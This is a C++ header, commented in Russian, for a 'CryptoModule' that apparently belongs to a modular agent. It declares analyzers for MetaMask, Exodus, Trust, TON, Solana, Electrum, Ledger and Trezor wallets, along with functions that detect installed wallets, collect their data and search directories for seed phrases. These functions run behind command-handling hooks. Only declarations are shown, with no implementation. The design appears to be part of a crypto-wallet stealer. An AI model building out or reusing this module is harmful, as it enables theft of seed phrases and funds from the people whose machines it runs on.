#ifndef MCEAS_CRYPTO_MODULE_H
#define MCEAS_CRYPTO_MODULE_H

#include "internal/common.h"
#include "internal/types.h"
#include "internal/module_base.h"
#include <vector>
#include <memory>

namespace mceas {

// Предварительное объявление для избежания циклических зависимостей
namespace crypto {
    struct SeedPhraseInfo;
}

// Перечисление типов криптокошельков
enum class WalletType {
    METAMASK,
    EXODUS,
    TRUST,
    TON,
    SOLANA,
    ELECTRUM,
    LEDGER,
    TREZOR,
    UNKNOWN
};

// Интерфейс для анализаторов криптокошельков
class WalletAnalyzer {
public:
    virtual ~WalletAnalyzer() = default;
    
    // Проверяет, установлен ли кошелек
    virtual bool isInstalled() = 0;
    
    // Возвращает тип кошелька
    virtual WalletType getType() = 0;
    
    // Возвращает имя кошелька
    virtual std::string getName() = 0;
    
    // Возвращает версию кошелька
    virtual std::string getVersion() = 0;
    
    // Возвращает путь к кошельку
    virtual std::string getWalletPath() = 0;
    
    // Собирает данные о кошельке
    virtual std::map<std::string, std::string> collectData() = 0;
};

// Модуль анализа криптокошельков
class CryptoModule : public ModuleBase {
public:
    CryptoModule();
    ~CryptoModule() override;

protected:
    // Реализация методов базового класса
    bool onInitialize() override;
    bool onStart() override;
    bool onStop() override;
    ModuleResult onExecute() override;
    bool onHandleCommand(const Command& command) override;

private:
    // Инициализация анализаторов кошельков
    void initAnalyzers();
    
    // Обнаружение установленных кошельков
    void detectWallets();
    
    // Поиск потенциальных seed-фраз в указанной директории
    std::vector<crypto::SeedPhraseInfo> searchSeedPhrases(const std::string& directory_path);
    
    // Список анализаторов кошельков
    std::vector<std::unique_ptr<WalletAnalyzer>> analyzers_;
    
    // Список обнаруженных кошельков
    std::vector<WalletAnalyzer*> detected_wallets_;
    
    // Найденные seed-фразы
    std::vector<crypto::SeedPhraseInfo> seed_phrases_;
};

} // namespace mceas

#endif // MCEAS_CRYPTO_MODULE_H